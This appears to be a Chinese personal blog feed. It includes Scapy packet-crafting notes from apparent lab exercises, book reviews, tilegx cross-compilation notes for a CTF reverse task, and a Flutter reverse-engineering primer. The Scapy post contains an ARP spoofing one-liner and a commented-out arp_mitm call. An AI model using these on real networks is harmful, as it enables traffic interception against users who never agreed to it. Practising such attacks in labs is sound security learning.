<p><a href="https://scapy.readthedocs.io/en/latest/usage.html">Usage — Scapy 2.5.0 documentation</a></p>
<p>一些可用的指令：</p>
<blockquote>
<p>ip route show</p>
<p>ip route add default via 10.0.0.1</p>
</blockquote>
<p>广播 Ethernet 包（srp1 注意增加 filter，这样不会收到自己发的包，或者用 srp 批量都接收）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get your MAC address (assuming you&#x27;re on a Linux system)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create the Ethernet frame with your MAC address as the source</span></span><br><span class="line">eth_frame = Ether(src=<span class="string">&quot;e6:d2:90:8f:34:8f&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>, <span class="built_in">type</span>=<span class="number">0xFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the Ethernet frame and receive packets</span></span><br><span class="line">reply_packets = srp1(eth_frame, timeout=<span class="number">2</span>, iface=<span class="string">&quot;eth0&quot;</span>, <span class="built_in">filter</span>=<span class="string">&quot;ether src not e6:d2:90:8f:34:8f&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Display received packets</span></span><br><span class="line"><span class="keyword">if</span> reply_packets:</span><br><span class="line">    <span class="built_in">print</span>(reply_packets.show())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No reply received.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>发送 ip 包（注意，这里是一层一层搭建的，每层的包正常运转下一层的包才能成功发送，！注意！前面的 type 不能指定，这里是自动对 field 适应的，指定后会导致后续上层信息丢包）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">eth_frame = Ether(src=<span class="string">&quot;3e:72:ce:70:a9:74&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip_packet = IP(proto=<span class="number">0xFF</span>, dst=<span class="string">&quot;10.0.0.3&quot;</span>,src=<span class="string">&quot;10.0.0.2&quot;</span>)</span><br><span class="line">packet = eth_frame/ip_packet</span><br><span class="line"></span><br><span class="line">reply_packets = srp1(packet, timeout=<span class="number">2</span>, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reply_packets:</span><br><span class="line">    <span class="built_in">print</span>(reply_packets.show())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No reply received.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>发送 tcp 包，和上面一样的注意事项就一遍过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">eth_frame = Ether(src=<span class="string">&quot;02:42:0a:00:b5:ef&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip_packet = IP(dst=<span class="string">&quot;10.0.0.3&quot;</span>,src=<span class="string">&quot;10.0.181.239&quot;</span>)</span><br><span class="line"></span><br><span class="line">tcp_packet = TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, ack=<span class="number">31337</span>, flags=<span class="string">&quot;APRSF&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = eth_frame/ip_packet/tcp_packet</span><br><span class="line"></span><br><span class="line">reply_packets = srp1(packet, timeout=<span class="number">2</span>, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reply_packets:</span><br><span class="line">    <span class="built_in">print</span>(reply_packets.show())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No reply received.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>官网的 demo： <code>a=Ether()/IP(dst=&quot;www.slashdot.org&quot;)/TCP()/&quot;GET /index.html HTTP/1.0 \n\n&quot;</code></p>
<p>TCP handshake：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">eth_frame = Ether(src=<span class="string">&quot;8a:c9:61:2b:94:3c&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip_packet = IP(dst=<span class="string">&quot;10.0.0.3&quot;</span>,src=<span class="string">&quot;10.0.0.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">tcp_packet = TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31337</span>, flags=<span class="string">&quot;S&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = eth_frame/ip_packet/tcp_packet</span><br><span class="line"></span><br><span class="line">reply_packets = srp1(packet, timeout=<span class="number">2</span>, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reply_packets:</span><br><span class="line">    <span class="built_in">print</span>(reply_packets.show())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No reply received.&quot;</span>)</span><br><span class="line"></span><br><span class="line">eth_frame = Ether(src=<span class="string">&quot;8a:c9:61:2b:94:3c&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">ip_packet = IP(dst=<span class="string">&quot;10.0.0.3&quot;</span>,src=<span class="string">&quot;10.0.0.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">tcp_packet = TCP(sport=<span class="number">31337</span>, dport=<span class="number">31337</span>, seq=<span class="number">31338</span>, ack = reply_packets.seq + <span class="number">1</span>, flags=<span class="string">&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = eth_frame/ip_packet/tcp_packet</span><br><span class="line"></span><br><span class="line">reply_packets = srp1(packet, timeout=<span class="number">3</span>, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reply_packets:</span><br><span class="line">    <span class="built_in">print</span>(reply_packets[<span class="number">0</span>].show())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No reply received.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ARP（注意 ARP 中的 hwsrc 需要再设置一次 mac，否则接收不到回包）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">eth_frame = Ether(src=<span class="string">&quot;3a:a0:e5:64:0f:e3&quot;</span>, dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">arp_packet = ARP(hwsrc=<span class="string">&quot;3a:a0:e5:64:0f:e3&quot;</span>,op=<span class="string">&#x27;is-at&#x27;</span>,psrc=<span class="string">&quot;10.0.0.2&quot;</span>,pdst=<span class="string">&quot;10.0.0.3&quot;</span>,hwdst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">packet = eth_frame/arp_packet</span><br><span class="line"></span><br><span class="line">reply_packets = srp1(packet, timeout=<span class="number">3</span>, iface=<span class="string">&quot;eth0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reply_packets:</span><br><span class="line">    <span class="built_in">print</span>(reply_packets.show())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No reply received.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(arp_mitm(&quot;10.0.0.3&quot;,&quot;10.0.0.2&quot;))</span></span><br></pre></td></tr></table></figure>
<p>ARP 欺骗（直接伪造 ip 即可）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sendp(Ether(src=get_if_hwaddr(<span class="string">&quot;eth0&quot;</span>), dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>) / ARP(op=<span class="string">&quot;is-at&quot;</span>, psrc=<span class="string">&quot;10.0.0.2&quot;</span>, hwsrc=get_if_hwaddr(<span class="string">&quot;eth0&quot;</span>)), iface=<span class="string">&quot;eth0&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>差一个题，稍微复杂，大概知道怎么做但是晚点做吧…</p>
]]></content>
  </entry>
  <entry>
    <title>《杀死一只知更鸟》</title>
    <url>/2023/11/27/%E3%80%8A%E6%9D%80%E6%AD%BB%E4%B8%80%E5%8F%AA%E7%9F%A5%E6%9B%B4%E9%B8%9F%E3%80%8B/</url>
    <content><![CDATA[<h6 id="preface推荐读物感觉以后专门开个分区"><a class="markdownIt-Anchor" href="#preface推荐读物感觉以后专门开个分区">#</a> PREFACE：推荐读物，感觉以后专门开个分区</h6>
<h6 id="todo修一下博客的分类功能"><a class="markdownIt-Anchor" href="#todo修一下博客的分类功能">#</a> TODO：修一下博客的分类功能</h6>
<span id="more"></span>
<p>确实是好书，不枉经典</p>
<p>笔触挺平和的，有点《葬送的芙莉蓮》那味（感觉这么比怪怪的，但是有神似之处）</p>
]]></content>
  </entry>
  <entry>
    <title>《被讨厌的勇气》</title>
    <url>/2023/11/13/%E3%80%8A%E8%A2%AB%E8%AE%A8%E5%8E%8C%E7%9A%84%E5%8B%87%E6%B0%94%E3%80%8B/</url>
    <content><![CDATA[<h6 id="preface哲学心理学作品与技术无关但是私认为每一个对自己的人生价值-意义对人际交往对自己的过去与未来心存迷茫或芥蒂的人或许都能从中感悟或碰撞出一些结论"><a class="markdownIt-Anchor" href="#preface哲学心理学作品与技术无关但是私认为每一个对自己的人生价值-意义对人际交往对自己的过去与未来心存迷茫或芥蒂的人或许都能从中感悟或碰撞出一些结论">#</a> PREFACE：哲学心理学作品，与技术无关，但是私认为每一个对自己的人生价值、意义，对人际交往，对自己的过去与未来心存迷茫或芥蒂的人，或许都能从中感悟或碰撞出一些结论</h6>
<h6 id="简单聊聊无指向或针对性"><a class="markdownIt-Anchor" href="#简单聊聊无指向或针对性">#</a> 简单聊聊，无指向或针对性</h6>
<span id="more"></span>
<p>​		看完了，总计花了 5h 左右，书不太长，看得比较慢。以哲学的口吻讲述阿德勒心理学，本质上是哲学，核心问题是以看待人际关系的角度（个人以及与他人的联系，以及我们的潜意识和表意识对待这种联系的态度）来解释个人的行为。阿德勒心理学也称为个体心理学，这本书基本上是立足于对个人的思考进行的。</p>
<p>​		书中采用年轻人和哲学家的对话进行（话说《苏菲的世界》好像也是类似的对话教学模式，莫不是哲学家都喜欢这样叙事 ×）</p>
<p>​		年轻人有的苦恼，以及年轻人举例的苦恼，感觉上是很多人都会有的。感觉猛猛对号入座了一把…</p>
<h6 id="todo有空再补补感想写一半写累了不想写了"><a class="markdownIt-Anchor" href="#todo有空再补补感想写一半写累了不想写了">#</a> TODO：有空再补补感想，写一半写累了不想写了</h6>
<p>​		总归为自己很长一段时间的探求给出了一个结论，接下来是对待这个结论的态度。</p>
<p>​		话说今天一天光看书了，啥活也没干，啥也没学，明明是最忙的周一：）</p>
]]></content>
  </entry>
  <entry>
    <title>交叉编译以及其他架构逆向初探</title>
    <url>/2023/08/26/%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%96%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-蓝帽杯初赛2023题目没做出来理论上能出实际上没时间就算有时间估计也不会去看那么多汇编但是既然结合0ctf2021也有一个类似折磨的pwn题虽然那个题很多种意义上说其实好很多即使我还是偏re手不过感觉还是有很多东西要学以及刚学到浅记录一下"><a class="markdownIt-Anchor" href="#preface-蓝帽杯初赛2023题目没做出来理论上能出实际上没时间就算有时间估计也不会去看那么多汇编但是既然结合0ctf2021也有一个类似折磨的pwn题虽然那个题很多种意义上说其实好很多即使我还是偏re手不过感觉还是有很多东西要学以及刚学到浅记录一下">#</a> preface: 蓝帽杯初赛 2023，题目没做出来，理论上能出，实际上没时间，就算有时间估计也不会去看那么多汇编，但是既然结合 0CTF2021 也有一个类似折磨的 pwn 题（虽然那个题很多种意义上说其实好很多，即使我还是偏 re 手）不过感觉还是有很多东西要学以及刚学到，浅记录一下。</h6>
<span id="more"></span>
<h5 id="一点前置知识iot安全研究视角的交叉编译-clang裁缝店-xuanxuanblingblinggithubio"><a class="markdownIt-Anchor" href="#一点前置知识iot安全研究视角的交叉编译-clang裁缝店-xuanxuanblingblinggithubio">#</a> 一点前置知识：<a href="https://xuanxuanblingbling.github.io/ctf/tools/2021/02/16/cross/">IoT 安全研究视角的交叉编译 | Clang 裁缝店 (xuanxuanblingbling.github.io)</a></h5>
<h5 id="这两片可以结合着看看后面那篇接近我的主要思路but-failed-qaq0ctf-tctf-2021-tile-clang裁缝店-xuanxuanblingblinggithubio-ctf20210703_0ctf_tctf_2021_qualstile-at-master-mephi42ctf-githubcom"><a class="markdownIt-Anchor" href="#这两片可以结合着看看后面那篇接近我的主要思路but-failed-qaq0ctf-tctf-2021-tile-clang裁缝店-xuanxuanblingblinggithubio-ctf20210703_0ctf_tctf_2021_qualstile-at-master-mephi42ctf-githubcom">#</a> 这两片可以结合着看看（后面那篇接近我的主要思路，but failed. QAQ）<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2021/07/05/tile/">0CTF / TCTF 2021 tile | Clang 裁缝店 (xuanxuanblingbling.github.io)</a>  |  <a href="https://github.com/mephi42/ctf/tree/master/2021.07.03_0CTF_TCTF_2021_Quals/tile">ctf/2021.07.03_0CTF_TCTF_2021_Quals/tile at master · mephi42/ctf (github.com)</a></h5>
<h5 id="基本流程搭建qemu环境尝试gdb调试发现缺so尤其稀有架构的so挺麻烦的"><a class="markdownIt-Anchor" href="#基本流程搭建qemu环境尝试gdb调试发现缺so尤其稀有架构的so挺麻烦的">#</a> 基本流程：搭建 qemu 环境尝试 gdb 调试（发现缺 so，尤其稀有架构的 so 挺麻烦的）</h5>
<h5 id="objdump切换架构硬看汇编结合ida识别的段猜比obj-d-的信息稍微清楚一点不过要记得"><a class="markdownIt-Anchor" href="#objdump切换架构硬看汇编结合ida识别的段猜比obj-d-的信息稍微清楚一点不过要记得">#</a> objdump 切换架构硬看汇编，结合 ida 识别的段猜（比 obj -D 的信息稍微清楚一点，不过要记得）</h5>
<h5 id="猜测是challenge1是0x7fchallenge2异或challenge3借助map做了什么操作怀疑是换序然后简单对字符处理"><a class="markdownIt-Anchor" href="#猜测是challenge1是0x7fchallenge2异或challenge3借助map做了什么操作怀疑是换序然后简单对字符处理">#</a> 猜测是 <code>challenge1</code>  是 <code>&amp;0x7f</code> ， <code>challenge2</code>  异或， <code>challenge3</code>  借助 map 做了什么操作，怀疑是换序然后简单对字符处理…</h5>
<h6 id="还学了这么个小知识点原生的qemu不支持nx故shellcode一把梭应该就行"><a class="markdownIt-Anchor" href="#还学了这么个小知识点原生的qemu不支持nx故shellcode一把梭应该就行">#</a> 还学了这么个小知识点： <code>原生的qemu不支持NX，故shellcode一把梭应该就行</code></h6>
<hr>
<h5 id="本体搭建过程"><a class="markdownIt-Anchor" href="#本体搭建过程">#</a> 本体搭建过程：</h5>
<h4 id="-qemu运行过程虽然题目中是缺so的但是确实是这么个流程"><a class="markdownIt-Anchor" href="#-qemu运行过程虽然题目中是缺so的但是确实是这么个流程">#</a> - qemu 运行过程（虽然题目中是缺 so 的，但是确实是这么个流程）</h4>
<h5 id="sudo-apt-install-git-libglib20-dev-libfdt-dev-libpixman-1-dev-zlib1g-dev"><a class="markdownIt-Anchor" href="#sudo-apt-install-git-libglib20-dev-libfdt-dev-libpixman-1-dev-zlib1g-dev">#</a>  <code>sudo apt install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev</code></h5>
<h5 id="git-clone-httpsgitqemuorggitqemugit"><a class="markdownIt-Anchor" href="#git-clone-httpsgitqemuorggitqemugit">#</a>  <code>git clone https://git.qemu.org/git/qemu.git</code></h5>
<h5 id="cd-qemu"><a class="markdownIt-Anchor" href="#cd-qemu">#</a>  <code>cd qemu</code></h5>
<h5 id="git-checkout-v500"><a class="markdownIt-Anchor" href="#git-checkout-v500">#</a> git checkout v5.0.0</h5>
<h5 id="configure-target-listtilegx-linux-user"><a class="markdownIt-Anchor" href="#configure-target-listtilegx-linux-user">#</a>  <code>./configure --target-list=tilegx-linux-user</code></h5>
<h5 id="make"><a class="markdownIt-Anchor" href="#make">#</a>  <code>make</code></h5>
<h5 id="cd-tilegx-linux-user"><a class="markdownIt-Anchor" href="#cd-tilegx-linux-user">#</a>  <code>cd tilegx-linux-user/</code></h5>
<h5 id="qemu-tilegx-desktopnewfolderchall"><a class="markdownIt-Anchor" href="#qemu-tilegx-desktopnewfolderchall">#</a>  <code>./qemu-tilegx ./Desktop/newFolder/chall</code></h5>
<h4 id="-objdump配置过程"><a class="markdownIt-Anchor" href="#-objdump配置过程">#</a> - objdump 配置过程：</h4>
<h5 id="wget-httpsftpgnuorggnubinutilsbinutils-235targz"><a class="markdownIt-Anchor" href="#wget-httpsftpgnuorggnubinutilsbinutils-235targz">#</a>  <code>wget https://ftp.gnu.org/gnu/binutils/binutils-2.35.tar.gz</code></h5>
<h5 id="tar-xvf-binutils-235targz"><a class="markdownIt-Anchor" href="#tar-xvf-binutils-235targz">#</a>  <code>tar xvf binutils-2.35.tar.gz</code></h5>
<h5 id="cd-binutils-235"><a class="markdownIt-Anchor" href="#cd-binutils-235">#</a>  <code>cd binutils-2.35</code></h5>
<h5 id="mkdir-build-cd-build"><a class="markdownIt-Anchor" href="#mkdir-build-cd-build">#</a>  <code>mkdir build &amp;&amp; cd build</code></h5>
<h5 id="configure-targettilegx-linux-gnu"><a class="markdownIt-Anchor" href="#configure-targettilegx-linux-gnu">#</a>  <code>../configure --target=tilegx-linux-gnu</code></h5>
<h5 id="make-2"><a class="markdownIt-Anchor" href="#make-2">#</a>  <code>make</code></h5>
<h5 id="tilegx-linux-gnu-objdump-d-~desktopnewfolderchall-outputasm"><a class="markdownIt-Anchor" href="#tilegx-linux-gnu-objdump-d-~desktopnewfolderchall-outputasm">#</a>  <code>tilegx-linux-gnu-objdump -d ~/Desktop/newFolder/chall &gt; output.asm</code></h5>
<h5 id="即可获得文件的汇编"><a class="markdownIt-Anchor" href="#即可获得文件的汇编">#</a> 即可获得文件的汇编</h5>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>初探flutter</title>
    <url>/2023/08/23/%E5%88%9D%E6%8E%A2flutter/</url>
    <content><![CDATA[<h6 id="preface-起因是wmctf2023有个anticheat2是基于flutter开发的中间也得用到相关知识-题目是一下子被队里师傅秒了555队里师傅秒题太快哩毫无存在感属于是但是总归还是得来补补功课啥也不学还是啥也不会-虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题"><a class="markdownIt-Anchor" href="#preface-起因是wmctf2023有个anticheat2是基于flutter开发的中间也得用到相关知识-题目是一下子被队里师傅秒了555队里师傅秒题太快哩毫无存在感属于是但是总归还是得来补补功课啥也不学还是啥也不会-虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题">#</a> preface: 起因是 WMCTF2023 有个 anticheat2 是基于 flutter 开发的，中间也得用到相关知识。题目是一下子被队里师傅秒了（<s>555 队里师傅秒题太快哩毫无存在感属于是</s>）但是总归还是得来补补功课，啥也不学还是啥也不会。（<s>虽然这会我的安卓环境还是不太彳亍容错很低当时比赛的时候就没有环境跑这个题</s>）</h6>
<span id="more"></span>
<h5 id="文档flutter-架构概览-flutter-中文文档-flutter-中文开发者网站-flutter"><a class="markdownIt-Anchor" href="#文档flutter-架构概览-flutter-中文文档-flutter-中文开发者网站-flutter">#</a> 文档：<a href="https://flutter.cn/docs/resources/architectural-overview">Flutter 架构概览 - Flutter 中文文档 - Flutter 中文开发者网站 - Flutter</a></h5>
<h5 id="参考文章reverse-engineering-flutter-apps-part-1-tstsh"><a class="markdownIt-Anchor" href="#参考文章reverse-engineering-flutter-apps-part-1-tstsh">#</a> 参考文章：<a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/">Reverse engineering Flutter apps (Part 1) (tst.sh)</a></h5>
<h5 id="reverse-engineering-flutter-apps-part-2-tstsh"><a class="markdownIt-Anchor" href="#reverse-engineering-flutter-apps-part-2-tstsh">#</a> <a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-2/">Reverse engineering Flutter apps (Part 2) (tst.sh)</a></h5>
<h5 id="todo工具"><a class="markdownIt-Anchor" href="#todo工具">#</a> TODO：<a href="https://bbs.kanxue.com/thread-275287.htm">工具</a></h5>
<h5 id="flutter逆向初探-2023国赛ctf的flutterror_1mmorta1的博客-csdn博客"><a class="markdownIt-Anchor" href="#flutter逆向初探-2023国赛ctf的flutterror_1mmorta1的博客-csdn博客">#</a> <a href="https://blog.csdn.net/qq_41866334/article/details/131032273">flutter 逆向初探 -- 2023 国赛 ctf 的 flutterror_1mmorta1 的博客 - CSDN 博客</a></h5>
<h5 id="reverse-engineering-flutter-apps-guardsquare"><a class="markdownIt-Anchor" href="#reverse-engineering-flutter-apps-guardsquare">#</a> <a href="https://www.guardsquare.com/blog/current-state-and-future-of-reversing-flutter-apps">Reverse Engineering Flutter Apps | Guardsquare</a></h5>
<h5 id="flutter架构分层系统上层组件依赖下层组件组件层间不可越权且各个部分可选可替代类似层与层间透明"><a class="markdownIt-Anchor" href="#flutter架构分层系统上层组件依赖下层组件组件层间不可越权且各个部分可选可替代类似层与层间透明">#</a> Flutter 架构：分层系统，上层组件依赖下层组件，组件层间不可越权且各个部分可选可替代（类似层与层间透明）</h5>
<h5 id="archdiagram"><a class="markdownIt-Anchor" href="#archdiagram">#</a> <img loading="lazy" data-src="%E5%88%9D%E6%8E%A2flutter/archdiagram.webp" alt="archdiagram"></h5>
<h6 id="对于底层操作系统而言flutter-应用程序的包装方式与其他原生应用相同-在每一个平台上会包含一个特定的嵌入层从而提供一个程序入口程序由此可以与底层操作系统进行协调访问诸如-surface-渲染-辅助功能和输入等服务并且管理事件循环队列-该嵌入层采用了适合当前平台的语言编写例如-android-使用的是-java-和-c-ios-和-macos-使用的是-objective-c-和-objective-cwindows-和-linux-使用的是-c-flutter-代码可以通过嵌入层以模块方式集成到现有的应用中也可以作为应用的主体-flutter-本身包含了各个常见平台的嵌入层同时也-存在一些其他的嵌入层"><a class="markdownIt-Anchor" href="#对于底层操作系统而言flutter-应用程序的包装方式与其他原生应用相同-在每一个平台上会包含一个特定的嵌入层从而提供一个程序入口程序由此可以与底层操作系统进行协调访问诸如-surface-渲染-辅助功能和输入等服务并且管理事件循环队列-该嵌入层采用了适合当前平台的语言编写例如-android-使用的是-java-和-c-ios-和-macos-使用的是-objective-c-和-objective-cwindows-和-linux-使用的是-c-flutter-代码可以通过嵌入层以模块方式集成到现有的应用中也可以作为应用的主体-flutter-本身包含了各个常见平台的嵌入层同时也-存在一些其他的嵌入层">#</a> 对于底层操作系统而言，Flutter 应用程序的包装方式与其他原生应用相同。在每一个平台上，会包含一个特定的嵌入层，从而提供一个程序入口，程序由此可以与底层操作系统进行协调，访问诸如 surface 渲染、辅助功能和输入等服务，并且管理事件循环队列。该嵌入层采用了适合当前平台的语言编写，例如 Android 使用的是 Java 和 C++， iOS 和 macOS 使用的是 Objective-C 和 Objective-C++，Windows 和 Linux 使用的是 C++。 Flutter 代码可以通过嵌入层，以模块方式集成到现有的应用中，也可以作为应用的主体。 Flutter 本身包含了各个常见平台的嵌入层，同时也 <a href="https://hover.build/blog/one-year-in/">存在一些其他的嵌入层</a>。</h6>
<h6 id="flutter-引擎-毫无疑问是-flutter-的核心它主要使用-c-编写并提供了-flutter-应用所需的原语-当需要绘制新一帧的内容时引擎将负责对需要合成的场景进行栅格化-它提供了-flutter-核心-api-的底层实现包括图形在-ios-和-android-上通过-impeller在其他平台上通过-skia-文本布局-文件及网络-io-辅助功能支持-插件架构和-dart-运行环境及编译环境的工具链"><a class="markdownIt-Anchor" href="#flutter-引擎-毫无疑问是-flutter-的核心它主要使用-c-编写并提供了-flutter-应用所需的原语-当需要绘制新一帧的内容时引擎将负责对需要合成的场景进行栅格化-它提供了-flutter-核心-api-的底层实现包括图形在-ios-和-android-上通过-impeller在其他平台上通过-skia-文本布局-文件及网络-io-辅助功能支持-插件架构和-dart-运行环境及编译环境的工具链">#</a> <strong>Flutter 引擎</strong> 毫无疑问是 Flutter 的核心，它主要使用 C++ 编写，并提供了 Flutter 应用所需的原语。当需要绘制新一帧的内容时，引擎将负责对需要合成的场景进行栅格化。它提供了 Flutter 核心 API 的底层实现，包括图形（在 iOS 和 Android 上通过 <a href="https://flutter.cn/docs/perf/impeller">Impeller</a>，在其他平台上通过 <a href="https://skia.org/">Skia</a>）、文本布局、文件及网络 IO、辅助功能支持、插件架构和 Dart 运行环境及编译环境的工具链。</h6>
<h6 id="引擎将底层-c-代码包装成-dart-代码通过-dartui-暴露给-flutter-框架层-该库暴露了最底层的原语包括用于驱动输入-图形-和文本渲染的子系统的类"><a class="markdownIt-Anchor" href="#引擎将底层-c-代码包装成-dart-代码通过-dartui-暴露给-flutter-框架层-该库暴露了最底层的原语包括用于驱动输入-图形-和文本渲染的子系统的类">#</a> <strong>引擎将底层 C++ 代码包装成 Dart 代码，通过 <a href="https://github.com/flutter/engine/tree/master/lib/ui"> <code>dart:ui</code> </a> 暴露给 Flutter 框架层。该库暴露了最底层的原语，包括用于驱动输入、图形、和文本渲染的子系统的类。</strong></h6>
<h5 id="应用结构app-anatomy"><a class="markdownIt-Anchor" href="#应用结构app-anatomy">#</a> 应用结构：<img loading="lazy" data-src="%E5%88%9D%E6%8E%A2flutter/app-anatomy.svg" alt="app-anatomy"></h5>
<h5 id="flutter构建的文件结构"><a class="markdownIt-Anchor" href="#flutter构建的文件结构">#</a> flutter 构建的文件结构：</h5>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">tree .</span><br><span class="line">.</span><br><span class="line">├── arm64-v8a</span><br><span class="line">│   ├── libapp.so</span><br><span class="line">│   └── libflutter.so</span><br><span class="line">└── armeabi-v7a</span><br><span class="line">    ├── libapp.so</span><br><span class="line">    └── libflutter.so</span><br></pre></td></tr></table></figure>
<p>Android apk 包中两个 libapp.so 文件，它们分别是作为 ELF 二进制文件的 a64 和 a32 快照。gen_snapshots 在此处输出 ELF / 共享对象可能会引起误解，它不会将 dart 方法公开为可以在外部调用的符号。相反，这些文件是 “cluster 化快照” 格式的容器，但在单独的可执行部分中包含编译的代码，以下是它们的结构：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">$ aarch64-linux-gnu-objdump -T libapp.so</span><br><span class="line"></span><br><span class="line">libapp.so:     file format elf64-littleaarch64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000001000 g    DF .text  0000000000004ba0 _kDartVmSnapshotInstructions</span><br><span class="line">0000000000006000 g    DF .text  00000000002d0de0 _kDartIsolateSnapshotInstructions</span><br><span class="line">00000000002d7000 g    DO .rodata        0000000000007f10 _kDartVmSnapshotData</span><br><span class="line">00000000002df000 g    DO .rodata        000000000021ad10 _kDartIsolateSnapshotData</span><br></pre></td></tr></table></figure>
<h5 id="dart-构建"><a class="markdownIt-Anchor" href="#dart-构建">#</a> <a href="https://github.com/dart-lang/sdk/wiki/Building">Dart 构建</a></h5>
<h5 id="dart混淆"><a class="markdownIt-Anchor" href="#dart混淆">#</a> <a href="https://github.com/flutter/flutter/wiki/Obfuscating-Dart-Code">Dart 混淆</a></h5>
<h5 id="dart-64的寄存器和函数调用约定"><a class="markdownIt-Anchor" href="#dart-64的寄存器和函数调用约定">#</a> dart 64 的寄存器和函数调用约定：</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       r0 |     | Returns</span><br><span class="line">r0  -  r7 |     | Arguments</span><br><span class="line">r0  - r14 |     | General purpose</span><br><span class="line">      r15 | sp  | Dart stack pointer</span><br><span class="line">      r16 | ip0 | Scratch register</span><br><span class="line">      r17 | ip1 | Scratch register</span><br><span class="line">      r18 |     | Platform register</span><br><span class="line">r19 - r25 |     | General purpose</span><br><span class="line">r19 - r28 |     | Callee saved registers</span><br><span class="line">      r26 | thr | Current thread</span><br><span class="line">      r27 | pp  | Object pool</span><br><span class="line">      r28 | brm | Barrier mask</span><br><span class="line">      r29 | fp  | Frame pointer</span><br><span class="line">      r30 | lr  | Link register</span><br><span class="line">      r31 | zr  | Zero / CSP</span><br></pre></td></tr></table></figure>
<h5 id="dart-32的寄存器和函数调用约定"><a class="markdownIt-Anchor" href="#dart-32的寄存器和函数调用约定">#</a> dart 32 的寄存器和函数调用约定：</h5>
